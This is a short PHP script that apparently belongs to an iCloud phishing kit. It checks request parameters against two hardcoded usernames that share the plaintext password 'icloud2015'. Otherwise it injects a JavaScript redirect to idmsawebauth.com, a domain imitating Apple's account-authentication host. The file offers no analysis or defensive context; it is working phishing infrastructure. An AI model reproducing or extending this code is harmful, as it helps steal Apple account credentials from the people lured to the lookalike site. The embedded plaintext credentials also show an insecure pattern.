<?php
$user=((string) $_REQUEST['user']);
$pass=((string) $_REQUEST['pass']);

if(!Empty($user) AND !Empty($pass))
{
if(($user=="ahmed" AND $pass=="icloud2015") OR ($user=="nizar" AND $pass=="icloud2015"))
{
echo 'OK';
}
else
{
echo 'NO';
}
}
else
{
print("<script type=\"text/javascript\">setTimeout('location=(\"http://idmsawebauth.com/"."\")' ,0);</script>");

}
?>